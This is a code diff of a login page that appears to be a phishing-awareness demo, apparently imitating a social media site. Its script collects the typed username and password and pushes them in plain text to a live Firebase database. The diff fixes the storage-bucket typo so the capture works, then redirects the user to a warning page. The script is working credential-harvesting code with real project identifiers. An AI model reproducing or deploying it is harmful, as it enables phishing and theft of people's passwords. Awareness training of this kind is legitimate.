@@ -78,7 +78,7 @@ button {
   <button onclick="saveLogin()">Log in</button>
 
   <div class="note">
-  Demo project — do not use real password
+    Demo project — do not use real password
   </div>
 </div>
 
@@ -91,7 +91,7 @@ const firebaseConfig = {
   authDomain: "cyberinsta-58734.firebaseapp.com",
   databaseURL: "https://cyberinsta-58734-default-rtdb.firebaseio.com",
   projectId: "cyberinsta-58734",
-  storageBucket: "yberinsta-58734.firebasestorage.app",
+  storageBucket: "cyberinsta-58734.firebasestorage.app",
   appId: "1:521267157175:web:8e403db43785b59901d532"
 };
 
@@ -99,27 +99,30 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
 window.saveLogin = function() {
-  const u = document.getElementById("user").value;
-  const p = document.getElementById("pass").value;
 
-  if(!u || !p){
-    alert("Enter username and password");
+  const u = document.getElementById("user").value.trim();
+  const p = document.getElementById("pass").value.trim();
+
+  if (!u || !p) {
+    alert("Please enter username and password");
     return;
   }
 
-  push(ref(db,"experimentLogins"), {
+  console.log("Attempting save...");
+
+  push(ref(db, "experimentLogins"), {
     username: u,
     password: p,
-    time: new Date().toString(),
-    purpose: "cyber security demo"
+    time: new Date().toISOString(),
+    source: "cyber security demo"
   })
   .then(() => {
-    console.log("Saved to Firebase ✅");
+    console.log("Saved successfully ✅");
     window.location.href = "warning.html";
   })
-  .catch((err) => {
-    console.error(err);
-    alert("Firebase save failed — check database rules");
+  .catch((error) => {
+    console.error("Save failed ❌", error);
+    alert("Save failed — check Firebase rules or Live Server");
   });
 }
 </script>
